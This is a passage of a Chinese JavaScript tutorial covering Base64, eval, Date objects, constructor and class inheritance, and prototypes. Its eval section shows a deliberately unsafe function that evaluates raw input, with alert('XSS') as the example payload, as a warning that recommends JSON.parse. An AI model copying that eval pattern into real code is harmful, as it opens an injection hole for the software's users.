function_">log</span>(base64); <span class="comment">// &quot;SGVsbG8sIEphdmFTY3JpcHQh&quot;</span></span><br><span class="line"><span class="keyword">var</span> decoded = <span class="title function_">atob</span>(base64);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(decoded); <span class="comment">// &quot;Hello, JavaScript!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// URL安全的Base64编码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">urlSafeBase64</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">btoa</span>(str)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/=+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">urlSafeBase64Decode</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    str = str.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&#x27;+&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/_/g</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">while</span> (str.<span class="property">length</span> % <span class="number">4</span>) str += <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">atob</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safeBase64 = <span class="title function_">urlSafeBase64</span>(<span class="string">&quot;Hello, JavaScript!&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(safeBase64); <span class="comment">// &quot;SGVsbG8sIEphdmFTY3JpcHQh&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">urlSafeBase64Decode</span>(safeBase64)); <span class="comment">// &quot;Hello, JavaScript!&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="13-eval"><a href="#13-eval" class="headerlink" title="13. eval"></a>13. eval</h2><p><strong>详细解释：</strong></p>
<ul>
<li><strong>eval()</strong>：执行传入的字符串作为JavaScript代码</li>
<li><strong>风险</strong>：可能执行恶意代码，造成安全漏洞</li>
<li><strong>替代方案</strong>：尽可能使用更安全的方法（如JSON.parse）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;var x = 10;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = <span class="built_in">eval</span>(<span class="string">&quot;2 + 3 * 4&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 14</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行函数</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;function greet(name) &#123; return &#x27;Hello, &#x27; + name; &#125;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">greet</span>(<span class="string">&quot;张三&quot;</span>)); <span class="comment">// &quot;Hello, 张三&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行JSON字符串（不安全，应使用JSON.parse）</span></span><br><span class="line"><span class="keyword">var</span> jsonStr = <span class="string">&#x27;&#123;&quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 25&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span> + jsonStr + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>); <span class="comment">// &quot;张三&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 作用域示例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testEval</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var y = 20;&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(y); <span class="comment">// 20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">testEval</span>();</span><br><span class="line"><span class="comment">// console.log(y); // 错误：y is not defined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全风险示例（不要在实际代码中使用）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">unsafeFunction</span>(<span class="params">input</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果input是&quot;alert(&#x27;XSS攻击&#x27;)&quot;，将执行恶意代码</span></span><br><span class="line">    <span class="built_in">eval</span>(input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全替代方案</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeFunction</span>(<span class="params">jsonStr</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonStr);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;无效的JSON&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态创建函数（比eval更安全）</span></span><br><span class="line"><span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;return a + b;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">func</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Function构造函数的注意事项</span></span><br><span class="line"><span class="keyword">var</span> userInput = <span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> safeFunc = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;input&quot;</span>, <span class="string">&quot;console.log(input);&quot;</span>);</span><br><span class="line"><span class="title function_">safeFunc</span>(userInput); <span class="comment">// 安全地输出字符串，不会执行代码</span></span><br></pre></td></tr></table></figure>

<h2 id="14-日期与时间"><a href="#14-日期与时间" class="headerlink" title="14. 日期与时间"></a>14. 日期与时间</h2><p><strong>详细解释：</strong></p>
<ul>
<li><strong>Date对象</strong>：用于处理日期和时间</li>
<li>支持多种创建方式：当前时间、指定时间、时间戳</li>
<li>提供丰富的方法获取和设置日期时间组件</li>
<li>时区处理：默认使用本地时区</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建Date对象</span></span><br><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>(); <span class="comment">// 当前日期时间</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now); <span class="comment">// 例如：Sun Oct 15 2023 14:30:00 GMT+0800 (中国标准时间)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> specificDate = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">2023</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">0</span>); <span class="comment">// 2023-10-15 14:30:00</span></span><br><span class="line"><span class="comment">// 注意：月份从0开始（0=1月，9=10月）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> timestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">1697323800000</span>); <span class="comment">// 从时间戳创建</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(timestamp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dateString = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;2023-10-15T14:30:00&quot;</span>); <span class="comment">// 从ISO 8601字符串创建</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dateString);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取日期时间组件</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getFullYear</span>()); <span class="comment">// 年份（4位）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getMonth</span>() + <span class="number">1</span>); <span class="comment">// 月份（0-11，需+1）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getDate</span>()); <span class="comment">// 日期（1-31）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getDay</span>()); <span class="comment">// 星期（0-6，0=星期日）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getHours</span>()); <span class="comment">// 小时（0-23）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getMinutes</span>()); <span class="comment">// 分钟（0-59）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getSeconds</span>()); <span class="comment">// 秒（0-59）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getMilliseconds</span>()); <span class="comment">// 毫秒（0-999）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getTime</span>()); <span class="comment">// 时间戳（从1970-01-01 00:00:00 UTC）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置日期时间组件</span></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">date.<span class="title function_">setFullYear</span>(<span class="number">2024</span>);</span><br><span class="line">date.<span class="title function_">setMonth</span>(<span class="number">0</span>); <span class="comment">// 1月</span></span><br><span class="line">date.<span class="title function_">setDate</span>(<span class="number">1</span>);</span><br><span class="line">date.<span class="title function_">setHours</span>(<span class="number">0</span>);</span><br><span class="line">date.<span class="title function_">setMinutes</span>(<span class="number">0</span>);</span><br><span class="line">date.<span class="title function_">setSeconds</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date); <span class="comment">// 2024-01-01 00:00:00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 日期计算</span></span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">var</span> tomorrow = <span class="keyword">new</span> <span class="title class_">Date</span>(today);</span><br><span class="line">tomorrow.<span class="title function_">setDate</span>(tomorrow.<span class="title function_">getDate</span>() + <span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;明天:&quot;</span>, tomorrow);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nextWeek = <span class="keyword">new</span> <span class="title class_">Date</span>(today);</span><br><span class="line">nextWeek.<span class="title function_">setDate</span>(nextWeek.<span class="title function_">getDate</span>() + <span class="number">7</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;下周:&quot;</span>, nextWeek);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日期格式化</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">formatDate</span>(<span class="params">date</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> year = date.<span class="title function_">getFullYear</span>();</span><br><span class="line">    <span class="keyword">var</span> month = (date.<span class="title function_">getMonth</span>() + <span class="number">1</span>).<span class="title function_">toString</span>().<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> day = date.<span class="title function_">getDate</span>().<span class="title function_">toString</span>().<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;year&#125;</span>-<span class="subst">$&#123;month&#125;</span>-<span class="subst">$&#123;day&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">formatDate</span>(<span class="keyword">new</span> <span class="title class_">Date</span>())); <span class="comment">// 例如：2023-10-15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间差计算</span></span><br><span class="line"><span class="keyword">var</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="comment">// 模拟一些操作</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// 空操作</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> end = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">var</span> duration = end - start;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`操作耗时: <span class="subst">$&#123;duration&#125;</span> 毫秒`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 时区处理</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">toISOString</span>()); <span class="comment">// ISO 8601格式（UTC时间）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">toLocaleString</span>()); <span class="comment">// 本地化格式</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">toLocaleDateString</span>()); <span class="comment">// 本地化日期</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">toLocaleTimeString</span>()); <span class="comment">// 本地化时间</span></span><br></pre></td></tr></table></figure>

<h2 id="15-面向对象编程"><a href="#15-面向对象编程" class="headerlink" title="15. 面向对象编程"></a>15. 面向对象编程</h2><h3 id="15-1-构造函数模式"><a href="#15-1-构造函数模式" class="headerlink" title="15.1 构造函数模式"></a>15.1 构造函数模式</h3><p><strong>详细解释：</strong></p>
<ul>
<li>使用函数作为构造函数</li>
<li>通过<code>new</code>关键字创建实例</li>
<li><code>this</code>指向新创建的对象</li>
<li>通过原型添加共享方法</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="comment">// 属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法（不推荐，每个实例都有独立副本）</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">greet</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>！`</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">25</span>);</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;李四&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">greet</span>(); <span class="comment">// 你好，张三！</span></span><br><span class="line">person2.<span class="title function_">greet</span>(); <span class="comment">// 你好，李四！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 问题：greet方法在每个实例中都有独立副本</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">greet</span> === person2.<span class="property">greet</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过原型添加共享方法</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayAge</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>的年龄是<span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span>岁`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">sayAge</span>(); <span class="comment">// 张三的年龄是25岁</span></span><br><span class="line">person2.<span class="title function_">sayAge</span>(); <span class="comment">// 李四的年龄是30岁</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查方法是否共享</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">sayAge</span> === person2.<span class="property">sayAge</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承示例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Student</span>(<span class="params">name, age, studentId</span>) &#123;</span><br><span class="line">    <span class="comment">// 调用父构造函数</span></span><br><span class="line">    <span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name, age);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">studentId</span> = studentId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置原型链</span></span><br><span class="line"><span class="title class_">Student</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Student</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Student</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加学生特有方法</span></span><br><span class="line"><span class="title class_">Student</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">study</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>正在学习`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> student1 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;王五&quot;</span>, <span class="number">20</span>, <span class="string">&quot;S12345&quot;</span>);</span><br><span class="line">student1.<span class="title function_">greet</span>(); <span class="comment">// 你好，王五！</span></span><br><span class="line">student1.<span class="title function_">sayAge</span>(); <span class="comment">// 王五的年龄是20岁</span></span><br><span class="line">student1.<span class="title function_">study</span>(); <span class="comment">// 王五正在学习</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查继承关系</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1 <span class="keyword">instanceof</span> <span class="title class_">Student</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1 <span class="keyword">instanceof</span> <span class="title class_">Person</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1 <span class="keyword">instanceof</span> <span class="title class_">Object</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="15-2-ES6类语法"><a href="#15-2-ES6类语法" class="headerlink" title="15.2 ES6类语法"></a>15.2 ES6类语法</h3><p><strong>详细解释：</strong></p>
<ul>
<li>使用<code>class</code>关键字定义类</li>
<li>更简洁的语法，但底层仍是原型继承</li>
<li>支持构造函数、方法、静态方法、继承</li>
<li>语法糖，与构造函数模式本质相同</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实例方法</span></span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>！`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取器</span></span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">ageInMonths</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">age</span> * <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置器</span></span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">nickname</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_nickname</span> = value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">nickname</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_nickname</span> || <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">createAnonymous</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;匿名用户&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">25</span>);</span><br><span class="line">person1.<span class="title function_">greet</span>(); <span class="comment">// 你好，张三！</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">ageInMonths</span>); <span class="comment">// 300</span></span><br><span class="line">person1.<span class="property">nickname</span> = <span class="string">&quot;小张&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">nickname</span>); <span class="comment">// &quot;小张&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态方法调用</span></span><br><span class="line"><span class="keyword">var</span> anonymous = <span class="title class_">Person</span>.<span class="title function_">createAnonymous</span>();</span><br><span class="line">anonymous.<span class="title function_">greet</span>(); <span class="comment">// 你好，匿名用户！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age, studentId</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(name, age);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">studentId</span> = studentId;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">study</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>正在学习，学号：<span class="subst">$&#123;<span class="variable language_">this</span>.studentId&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写父类方法</span></span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>.<span class="title function_">greet</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`我是学生，学号：<span class="subst">$&#123;<span class="variable language_">this</span>.studentId&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> student1 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;李四&quot;</span>, <span class="number">20</span>, <span class="string">&quot;S12345&quot;</span>);</span><br><span class="line">student1.<span class="title function_">greet</span>(); </span><br><span class="line"><span class="comment">// 你好，李四！</span></span><br><span class="line"><span class="comment">// 我是学生，学号：S12345</span></span><br><span class="line">student1.<span class="title function_">study</span>(); <span class="comment">// 李四正在学习，学号：S12345</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查继承关系</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1 <span class="keyword">instanceof</span> <span class="title class_">Student</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1 <span class="keyword">instanceof</span> <span class="title class_">Person</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类表达式</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Animal</span> = <span class="keyword">class</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">speak</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>发出声音`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&quot;狗&quot;</span>);</span><br><span class="line">dog.<span class="title function_">speak</span>(); <span class="comment">// 狗发出声音</span></span><br></pre></td></tr></table></figure>

<h2 id="16-原型"><a href="#16-原型" class="headerlink" title="16. 原型"></a>16. 原型</h2><h3 id="16-1-原型的基本概念"><a href="#16-1-原型的基本概念" class="headerlink" title="16.1 原型的基本概念"></a>16.1 原型的基本概念</h3><p><strong>详细解释：</strong></p>
<ul>
<li><strong>原型</strong>：JavaScript中实现继承的机制</li>
<li>每个函数都有<code>prototype</code>属性，指向原型对象</li>
<li>每个对象都有<code>__proto__</code>属性，指向其构造函数的原型</li>
<li>当访问对象属性时，如果对象本身没有，会沿着原型链查找</li>
<li>原型链最终指向<code>Object.prototype</code>，再往上是<code>null</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原型基本概念</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加原型方法</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>！`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查原型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Person</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用原型方法</span></span><br><span class="line">person1.<span class="title function_">greet</span>(); <span class="comment">// 你好，张三！</span></span><br><span class="line">person2.<span class="title function_">greet</span>(); <span class="comment">// 你好，李四！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查方法是否共享</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">greet</span> === person2.<span class="property">greet</span>); <span class="comment">// 